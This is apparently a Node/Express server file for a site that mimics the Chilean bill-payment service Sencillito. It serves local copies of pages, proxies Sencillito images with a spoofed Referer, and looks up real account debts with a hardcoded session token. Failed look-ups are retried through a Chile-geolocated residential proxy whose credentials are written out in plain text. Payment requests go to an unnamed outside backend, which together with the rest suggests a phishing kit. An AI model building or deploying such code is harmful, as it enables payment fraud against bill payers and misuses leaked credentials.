const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());

// ============================================================
// 1. INTERCEPTOR DE HTML (Arregla las imágenes sin tocar los HTML)
// ============================================================
// Esto intercepta cualquier archivo .html que se sirva y reemplaza
// las URLs de las imágenes de Sencillito por el proxy interno.
app.use(async (req, res, next) => {
    // Si la petición no es para un archivo HTML, pasa de largo
    if (!req.path.endsWith('.html') && req.path !== '/') return next();

    const filePath = req.path === '/' ? path.join(__dirname, 'index.html') : path.join(__dirname, req.path);
    
    try {
        if (fs.existsSync(filePath)) {
            let html = fs.readFileSync(filePath, 'utf8');
            
            // Busca todas las imágenes de Sencillito y las cambia al proxy local
            html = html.replace(/src="(https:\/\/sencillito\.com\/documents\/[^"]+)"/g, 'src="/img-proxy?url=$1"');
            
            return res.send(html);
        }
        next();
    } catch (error) {
        next();
    }
});

// Servir el resto de archivos estáticos normales
app.use(express.static(path.join(__dirname)));

// ============================================================
// 2. PROXY PARA IMÁGENES (Evita el bloqueo de Hotlinking)
// ============================================================
app.get('/img-proxy', async (req, res) => {
    const imageUrl = req.query.url;
    if (!imageUrl || !imageUrl.startsWith('https://sencillito.com/')) {
        return res.status(400).send('URL no válida');
    }

    try {
        const response = await axios.get(imageUrl, {
            responseType: 'arraybuffer',
            timeout: 15000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': 'https://sencillito.com/'
            }
        });

        res.setHeader('Content-Type', response.headers['content-type']);
        res.setHeader('Cache-Control', 'public, max-age=86400'); // Caché 24h
        res.send(response.data);
    } catch (error) {
        console.error('Error img-proxy:', error.message);
        // Imagen transparente de 1x1 si falla
        res.setHeader('Content-Type', 'image/gif');
        res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    }
});

// ============================================================
// 3. ENDPOINT PARA CONSULTAR DEUDA (Directo + Fallback Geonode)
// ============================================================
app.get('/api/consultar-deuda', async (req, res) => {
    const { accountReference, utilityNumber, utilityVersion, industriaId } = req.query;

    if (!accountReference || !utilityNumber || !utilityVersion || !industriaId) {
        return res.status(400).json({ error: 'Faltan parámetros requeridos' });
    }

    const urlSencillito = `https://sencillito.com/o/portal-publico/consulta-saldo/?accountReference=${accountReference}&utilityNumber=${utilityNumber}&utilityVersion=${utilityVersion}&industriaId=${industriaId}&productTypeId=null&userId=61610&session_key=null&p_auth=UsAcGwzA`;

    try {
        // Intento 1: Directo
        const response = await axios.get(urlSencillito, {
            timeout: 15000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://sencillito.com/'
            }
        });
        res.json(response.data);
    } catch (error) {
        console.warn("Directo falló, intentando Geonode...");
        try {
            // Intento 2: Con Geonode (por si acaso)
            const responseProxy = await axios.get(urlSencillito, {
                timeout: 15000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*'
                },
                proxy: {
                    protocol: 'http',
                    host: '92.204.164.13',
                    port: 9000,
                    auth: { username: 'geonode_PKlL1yvoTG-country-cl', password: '605d224e-19b6-4baa-8107-296ee7d836f5' }
                }
            });
            res.json(responseProxy.data);
        } catch (errorProxy) {
            res.status(500).json({ error: 'No se pudo consultar la deuda. Intenta más tarde.' });
        }
    }
});

// ============================================================
// 4. PROXY PARA PAGOS (Intacto)
// ============================================================
const PAGOS_BACKEND_URL = process.env.PAGOS_BACKEND_URL;

app.post('/api/crear-pago', async (req, res) => {
    if (!PAGOS_BACKEND_URL) return res.status(500).json({ success: false, error: 'Backend no configurado' });
    try {
        const response = await axios.post(`${PAGOS_BACKEND_URL}/api/crear-pago`, req.body, { timeout: 20000 });
        return res.status(response.status).json(response.data);
    } catch (err) {
        if (err.response) return res.status(err.response.status).json(err.response.data);
        return res.status(502).json({ success: false, error: 'Error de conexión' });
    }
});

app.get('/api/estado-pago/:id', async (req, res) => {
    if (!PAGOS_BACKEND_URL) return res.status(500).json({ success: false, error: 'Backend no configurado' });
    try {
        const response = await axios.get(`${PAGOS_BACKEND_URL}/api/estado-pago/${req.params.id}`, { timeout: 10000 });
        return res.status(response.status).json(response.data);
    } catch (err) {
        if (err.response) return res.status(err.response.status).json(err.response.data);
        return res.status(502).json({ success: false, error: 'Error de conexión' });
    }
});

// ============================================================
// START
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
    console.log(`Proxy pagos → ${PAGOS_BACKEND_URL ? 'OK' : 'FALTA PAGOS_BACKEND_URL'}`);
});
